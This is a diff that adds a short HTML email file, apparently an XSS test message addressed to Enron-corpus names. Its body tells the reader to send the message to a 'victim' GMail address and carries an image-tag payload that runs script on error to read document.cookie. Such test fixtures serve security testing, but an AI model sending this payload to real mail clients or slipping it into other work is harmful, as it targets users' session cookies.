@@ -1,0 +1,7 @@
+From: community-relations@enron.com
+To: kay.mann@enron.com, ed.mcmichael@enron.com, eric.boyt@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+Send an email to the victim GMail address with the From field.<img src=# onerror=alert(document.cookie)>.
